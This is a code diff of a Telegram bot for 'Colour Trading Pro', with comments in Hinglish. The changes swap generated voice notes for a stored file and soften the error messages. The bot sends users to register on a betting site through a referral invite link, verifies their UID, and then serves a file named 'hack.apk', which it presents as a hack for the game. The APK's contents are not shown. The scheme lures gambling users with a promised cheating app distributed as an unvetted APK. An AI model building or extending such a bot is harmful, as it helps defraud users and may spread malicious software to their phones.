@@ -1,9 +1,7 @@
 import os
-import tempfile
 from aiogram import Router, types
 from aiogram.filters import Command
 from aiogram.types import FSInputFile
-from gtts import gTTS
 
 router = Router()
 
@@ -34,24 +32,27 @@ def setup_handlers(bot_instance):
     @router.message(Command("start"))
     async def start_command(message: types.Message):
         try:
+            # 1. Pehle text message har haal mein bhejein
             await message.answer(WELCOME_TEXT, parse_mode="Markdown")
             
-            # Voice note generation
+            # 2. Voice note ko alag try-except mein rakhein taaki iski wajah se bot crash na ho
             try:
-                tts = gTTS(text="Welcome to Colour Trading Pro family. Hamare saare tools aur signals bilkul free hain.", lang="hi", slow=False)
-                with tempfile.NamedTemporaryFile(delete=False, suffix=".mp3") as tmp:
-                    tts.save(tmp.name)
-                    tmp_name = tmp.name
-                
-                voice = FSInputFile(tmp_name)
-                await message.answer_voice(voice)
-                os.unlink(tmp_name)
-            except Exception as e:
-                print(f"⚠️ Voice note error: {e}")
+                # OPTION A: Agar aapke paas voice.mp3 file repository mein hai:
+                if os.path.exists("voice.mp3"):
+                    voice = FSInputFile("voice.mp3")
+                    await message.answer_voice(voice)
+                else:
+                    # OPTION B: Best Tarika (Telegram File ID)
+                    # Apne bot ko manually ek voice note bhejein, uski file_id nikaal kar yahan daal dein:
+                    # await message.answer_voice(voice="AAQDAgADgQcAAl...aapki_file_id_yahan")
+                    pass
+            except Exception as voice_err:
+                print(f"⚠️ Voice note sending skipped/failed: {voice_err}")
                 
         except Exception as e:
-            print(f"❌ start_command error: {e}")
-            await message.answer("⚠️ Kuch technical issue hai. Please try again later.")
+            print(f"❌ Critical start_command error: {e}")
+            # Ab yeh error tabhi aayega jab Telegram API hi down hogi
+            await message.answer("⚠️ System update ho raha hai. Please try again after 1 minute.")
     
     @router.message(Command("verify"))
     async def verify_command(message: types.Message):
@@ -62,20 +63,17 @@ def setup_handlers(bot_instance):
                 return
             
             uid = args[1]
-            
-            # Non-blocking execution fallback handle karne ke liye simple call
             if bot_instance.verify_uid(uid):
                 await message.answer(f"✅ Verified! UID: {uid}\nAb /getapk use karein hack APK ke liye.")
             else:
                 await message.answer("❌ UID nahi mili. Pehle hamare link se register karein:\nhttps://13lgame18.com/register?inviteCode=HTJ65XW&from=web")
         except Exception as e:
             print(f"❌ verify_command error: {e}")
-            await message.answer("⚠️ Verification complete nahi ho saki. Please contact admin @tech_jadugar.")
+            await message.answer("⚠️ Verification service temporarily unavailable.")
             
     @router.message(Command("getapk"))
     async def get_apk_command(message: types.Message):
         try:
-            # Check if file exists safely
             if os.path.exists("hack.apk"):
                 apk = FSInputFile("hack.apk")
                 await message.answer_document(
